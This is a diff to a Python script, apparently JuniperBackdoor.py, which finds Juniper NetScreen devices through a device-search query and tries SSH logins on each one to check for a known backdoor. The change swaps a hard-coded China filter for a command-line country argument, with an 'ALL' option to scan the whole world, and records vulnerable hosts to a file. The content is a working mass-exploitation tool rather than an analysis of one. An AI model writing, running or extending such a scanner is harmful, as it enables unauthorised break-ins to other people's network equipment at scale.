@@ -57,10 +57,10 @@ def connectSSH(host, user, passwd):
     except Exception, e:
         print "%s is not vul" % host
 
-def getIp(page):
+def getIp(query, page):
     start_time = time.time()
     data = {
-        "query":"22.ssh.banner.software_version:NetScreen location.country:China", 
+        "query":query, 
         "page":page, 
         "fields":["ip"]
     }
@@ -88,12 +88,28 @@ def test():
         t.start()
 
 if __name__ == '__main__':
+    if len(sys.argv) != 2:
+        print """
+usage: 
+    using python JuniperBackdoor.py [country] to scan the hosts
+    in the country you set
+    
+    using python JuniperBackdoor.py ALL to scan the hole world
+        """
+        sys.exit()
+    else:
+        country = sys.argv[1]
+        if country == "ALL":
+            query = "22.ssh.banner.software_version:NetScreen"
+        else:
+            query = "22.ssh.banner.software_version:NetScreen location.country:%s" % country
+    print query
     ip_OK = open("ip_OK.txt", "w")
-    getIp(cur_page)
+    getIp(query, cur_page)
     test()
     while queue.qsize() > 0:
         if cur_page <= PAGES:
-            getIp(cur_page)
+            getIp(query, cur_page)
             cur_page += 1
         time.sleep(0.1)
     ip_OK.close()
